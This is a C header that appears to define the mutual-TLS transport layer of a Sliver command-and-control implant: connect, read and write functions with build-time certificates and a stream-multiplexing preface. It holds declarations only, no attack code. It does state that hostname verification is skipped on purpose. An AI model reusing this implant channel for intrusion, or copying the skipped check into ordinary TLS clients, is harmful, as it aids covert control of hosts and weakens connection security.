/* sliver/transport.h - transport layer entry points (TLS 1.3 mTLS first). */
#ifndef SLIVER_TRANSPORT_H
#define SLIVER_TRANSPORT_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

typedef struct sliver_tls sliver_tls_t;

/* Connects to host:port and performs a TLS 1.3 handshake as a client.
 *
 * ca_pem / cert_pem / key_pem are the PEM blobs injected at build time
 * ({{.Build.MtlsCACert}} etc). Hostname verification is intentionally skipped:
 * Sliver only verifies that the server certificate chains to its own CA.
 *
 * On success *out is a usable connection. On failure NULL is returned and err
 * (when non-NULL) receives a printable reason. */
int sliver_tls_connect(sliver_tls_t **out, const char *host, uint16_t port,
                       const char *ca_pem, const char *cert_pem, const char *key_pem,
                       char *err, size_t err_len);

/* Returns bytes written, or -1. */
long sliver_tls_write(sliver_tls_t *conn, const void *buf, size_t len);
/* Returns bytes read (>0), 0 on clean EOF, or -1. */
long sliver_tls_read(sliver_tls_t *conn, void *buf, size_t len);
/* Returns the negotiated protocol version string ("TLSv1.3"). */
const char *sliver_tls_version(sliver_tls_t *conn);
/* Returns the negotiated cipher suite name. */
const char *sliver_tls_ciphersuite(sliver_tls_t *conn);
void sliver_tls_close(sliver_tls_t *conn);

/* Sliver's yamux preface, written immediately after the TLS handshake. */
#define SLIVER_YAMUX_PREFACE "MUX/1"
#define SLIVER_YAMUX_PREFACE_LEN 5

#ifdef __cplusplus
}
#endif

#endif /* SLIVER_TRANSPORT_H */
